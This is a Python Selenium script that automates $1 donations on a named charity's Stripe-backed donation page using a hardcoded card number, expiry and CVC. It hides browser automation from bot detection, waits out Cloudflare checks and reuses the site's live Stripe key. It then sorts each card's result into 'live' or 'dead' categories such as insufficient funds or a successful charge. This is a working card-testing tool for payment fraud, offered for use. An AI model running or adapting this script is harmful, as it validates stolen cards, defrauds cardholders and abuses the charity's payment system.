import time
import re
import json
import random
import os
import sys


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

TARGET_URL = 'https://goodhope.org/giving/?form-id=12124&payment-mode=stripe&level-id=custom&custom-amount=1.00'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


# ═══════════════════════════════════════════════════════════
# SETUP DRIVER
# ═══════════════════════════════════════════════════════════

def setup_driver():
    """إعداد Chrome Driver"""
    print("🚀 Setting up driver...")
    
    # ═══ Try undetected-chromedriver أولاً ═══
    try:
        import undetected_chromedriver as uc
        
        print("✅ Using undetected-chromedriver")
        
        options = uc.ChromeOptions()
        options.binary_location = '/usr/bin/chromium'
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--headless=new')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument(
            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
        )
        
        try:
            driver = uc.Chrome(
                options=options,
                driver_executable_path='/usr/bin/chromedriver',
                use_subprocess=True
            )
        except Exception as e:
            print(f"⚠️ First launch failed: {e}")
            driver = uc.Chrome(options=options, use_subprocess=True)
        
        print("✅ undetected-chromedriver launched")
        return driver
    
    except Exception as e:
        print(f"⚠️ undetected failed: {e}")
        print("⚠️ Falling back to regular Selenium")
    
    
    # ═══ Fallback: Regular Selenium ═══
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    
    options = Options()
    options.binary_location = '/usr/bin/chromium'
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--headless=new')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument(
        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
    )
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    if os.path.exists('/usr/bin/chromedriver'):
        service = Service('/usr/bin/chromedriver')
        driver = webdriver.Chrome(service=service, options=options)
    else:
        driver = webdriver.Chrome(options=options)
    
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    
    print("✅ Regular Selenium launched")
    return driver


# ═══════════════════════════════════════════════════════════
# MAIN FLOW
# ═══════════════════════════════════════════════════════════

def run():
    print("=" * 60)
    print("🎯 STARTING CHECK")
    print(f"🔗 URL: {TARGET_URL}")
    print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
    print("=" * 60)
    
    driver = None
    try:
        # ═══ Step 1: Setup driver ═══
        driver = setup_driver()
        
        # ═══ Step 2: Open page ═══
        print(f"\n🌐 Opening page...")
        driver.get(TARGET_URL)
        
        # ═══ Step 3: Wait for page to load + Cloudflare (if any) ═══
        print("⏳ Waiting for page...")
        max_wait = 60
        start = time.time()
        page_ready = False
        
        while time.time() - start < max_wait:
            try:
                html = driver.page_source
                html_lower = html.lower()
                
                # Check for Cloudflare
                if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                    elapsed = int(time.time() - start)
                    print(f"   ⏳ Cloudflare... ({elapsed}s)")
                    time.sleep(2)
                    continue
                
                # Check for form
                if 'give-form-id' in html or 'pk_live_' in html or 'stripe' in html_lower:
                    page_ready = True
                    print(f"✅ Page ready after {int(time.time() - start)}s")
                    break
                
                time.sleep(1)
            except:
                time.sleep(1)
        
        if not page_ready:
            return "PAGE_LOAD_TIMEOUT"
        
        # ═══ Step 4: Extract page data ═══
        html = driver.page_source
        print(f"📄 HTML Length: {len(html)}")
        print(f"📍 Title: {driver.title}")
        print(f"📍 URL: {driver.current_url}")
        
        # ═══ Extract Form Data ═══
        form_id = None
        form_hash = None
        form_prefix = None
        stripe_key = None
        
        # From elements
        try:
            els = driver.find_elements("name", "give-form-id")
            if els:
                form_id = els[0].get_attribute("value")
        except: pass
        
        try:
            els = driver.find_elements("name", "give-form-hash")
            if els:
                form_hash = els[0].get_attribute("value")
        except: pass
        
        try:
            els = driver.find_elements("name", "give-form-id-prefix")
            if els:
                form_prefix = els[0].get_attribute("value")
        except: pass
        
        # From HTML
        if not form_id:
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
            if m:
                form_id = m.group(1)
        
        if not form_hash:
            m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
            if m:
                form_hash = m.group(1)
        
        if not form_prefix:
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            if m:
                form_prefix = m.group(1)
        
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        # Fallback values (from your Console)
        if not form_id:
            form_id = '12124'
        if not form_hash:
            form_hash = '54fcc028ca'
        if not form_prefix:
            form_prefix = '12124-1'
        if not stripe_key:
            stripe_key = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        # ═══ Step 5: Generate Stripe Payment Method ═══
        print("\n💳 Generating Stripe Payment Method...")
        
        stripe_js = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        var name = arguments[5];
        var email = arguments[6];
        
        (async () => {
            try {
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                if (typeof Stripe === 'undefined') {
                    callback(JSON.stringify({error: 'Stripe.js not available'}));
                    return;
                }
                
                const stripe = Stripe(stripeKey);
                
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: {
                        number: cardNum,
                        exp_month: parseInt(expM),
                        exp_year: parseInt(expY),
                        cvc: cvc
                    },
                    billing_details: {
                        name: name,
                        email: email,
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            driver.set_script_timeout(30)
            result_raw = driver.execute_async_script(
                stripe_js,
                stripe_key,
                CARD_NUMBER,
                EXP_MONTH,
                EXP_YEAR,
                CVC,
                f'{FIRST_NAME} {LAST_NAME}',
                EMAIL
            )
            
            print(f"📥 Stripe JS: {result_raw[:400]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                # ═══ Translate Stripe error to live/dead ═══
                if decline:
                    return f"STRIPE_{decline.upper()}: {error[:100]}"
                
                if code:
                    code_upper = code.upper()
                    
                    if code_upper in ['CARD_DECLINED', 'EXPIRED_CARD', 'INCORRECT_CVC', 'INCORRECT_NUMBER', 'INSUFFICIENT_FUNDS', 'CARD_NOT_SUPPORTED', 'PROCESSING_ERROR']:
                        if 'INSUFFICIENT' in error.upper():
                            return "INSUFFICIENT_FUNDS"
                        if 'DECLINED' in error.upper():
                            return "DECLINED"
                        if 'EXPIRED' in error.upper():
                            return "EXPIRED_CARD"
                        return f"STRIPE_{code_upper}"
                    
                    return f"STRIPE_{code_upper}: {error[:100]}"
                
                return f"STRIPE_ERROR: {error[:100]}"
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM ID: {pm_id}")
            
            # ═══ Step 6: Submit Donation Form ═══
            print("\n💸 Submitting donation form...")
            
            # Fill form fields via JS
            submit_js = """
            var callback = arguments[arguments.length - 1];
            var args = arguments;
            
            try {
                // Find the form
                var form = document.querySelector('form[id*="give-form"]') || 
                           document.querySelector('form.give-form') ||
                           document.querySelector('form');
                
                if (!form) {
                    callback(JSON.stringify({error: 'Form not found'}));
                    return;
                }
                
                // Fill fields
                var fields = {
                    'give-amount': '1.00',
                    'give_first': args[0],
                    'give_last': args[1],
                    'give_email': args[2],
                    'card_name': args[3] + ' ' + args[4]
                };
                
                for (var name in fields) {
                    var input = form.querySelector('[name="' + name + '"]');
                    if (input) {
                        input.value = fields[name];
                        input.dispatchEvent(new Event('input', {bubbles: true}));
                        input.dispatchEvent(new Event('change', {bubbles: true}));
                    }
                }
                
                // Add Stripe PM hidden field
                var pmField = form.querySelector('[name="give_stripe_payment_method"]');
                if (!pmField) {
                    pmField = document.createElement('input');
                    pmField.type = 'hidden';
                    pmField.name = 'give_stripe_payment_method';
                    form.appendChild(pmField);
                }
                pmField.value = args[5];  // pm_id
                
                // Add give_action
                var actionField = form.querySelector('[name="give_action"]');
                if (!actionField) {
                    actionField = document.createElement('input');
                    actionField.type = 'hidden';
                    actionField.name = 'give_action';
                    form.appendChild(actionField);
                }
                actionField.value = 'purchase';
                
                // Add gateway
                var gwField = form.querySelector('[name="give-gateway"]');
                if (!gwField) {
                    gwField = document.createElement('input');
                    gwField.type = 'hidden';
                    gwField.name = 'give-gateway';
                    form.appendChild(gwField);
                }
                gwField.value = 'stripe';
                
                // Submit
                var submitBtn = form.querySelector('button[type="submit"]') ||
                                form.querySelector('input[type="submit"]') ||
                                form.querySelector('.give-submit');
                
                if (submitBtn) {
                    submitBtn.click();
                    callback(JSON.stringify({success: true, action: 'clicked'}));
                } else {
                    form.submit();
                    callback(JSON.stringify({success: true, action: 'submitted'}));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
            """
            
            # Try to submit via JS
            try:
                submit_result_raw = driver.execute_async_script(
                    submit_js,
                    FIRST_NAME,
                    LAST_NAME,
                    EMAIL,
                    FIRST_NAME,
                    LAST_NAME,
                    pm_id
                )
                print(f"📤 Submit result: {submit_result_raw}")
            except Exception as e:
                print(f"⚠️ Submit JS error: {e}")
            
            # ═══ Step 7: Wait for result ═══
            print("\n⏳ Waiting for result...")
            
            result_text = ""
            max_wait_result = 25
            start_result = time.time()
            
            while time.time() - start_result < max_wait_result:
                try:
                    html_now = driver.page_source
                    text_now = driver.find_element("tag name", "body").text
                    
                    # Check for live responses
                    text_lower = text_now.lower()
                    
                    live_keywords = [
                        'insufficient', 'declined', 'expired',
                        'fraud', 'do not honor', 'do_not_honor',
                        'thank you', 'success', 'complete',
                        'failed', 'error', 'processing_error',
                        'card_error'
                    ]
                    
                    for kw in live_keywords:
                        if kw in text_lower:
                            result_text = text_now
                            break
                    
                    if result_text:
                        break
                    
                    time.sleep(1)
                except:
                    time.sleep(1)
            
            # ═══ Parse result ═══
            if result_text:
                return parse_result(result_text, driver.page_source)
            
            # If no clear result, check URL
            current_url = driver.current_url
            if 'givewp-success' in current_url or 'donation-confirmation' in current_url:
                return "CHARGE 1.0"
            
            return "NO_RESULT"
        
        except Exception as e:
            return f"Error: {str(e)[:200]}"
    
    except Exception as e:
        return f"Fatal Error: {str(e)[:200]}"
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


# ═══════════════════════════════════════════════════════════
# Parse Result
# ═══════════════════════════════════════════════════════════

def parse_result(text, html=""):
    """تحليل الرد"""
    text_lower = text.lower()
    html_lower = html.lower()
    
    # Live responses
    responses = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'insufficient funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'fraudulent': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'card number is incorrect': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'do not honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
        'completed': 'CHARGE 1.0',
        'donation complete': 'CHARGE 1.0',
    }
    
    for kw, resp in responses.items():
        if kw in text_lower:
            return resp
    
    # Search in HTML
    for kw, resp in responses.items():
        if kw in html_lower:
            return resp
    
    # Generic
    if 'error' in text_lower:
        m = re.search(r'error[:\s]+([^<\n]{10,150})', text_lower)
        if m:
            return f"ERROR: {m.group(1)[:100]}"
    
    if text.strip():
        return f"UNKNOWN: {' '.join(text.split())[:200]}"
    
    return "NO_RESULT"


# ═══════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════

if __name__ == '__main__':
    try:
        result = run()
        print("\n" + "=" * 60)
        print(f"📊 FINAL RESULT: {result}")
        print("=" * 60)
    except Exception as e:
        print(f"\n❌ FATAL: {str(e)[:300]}")
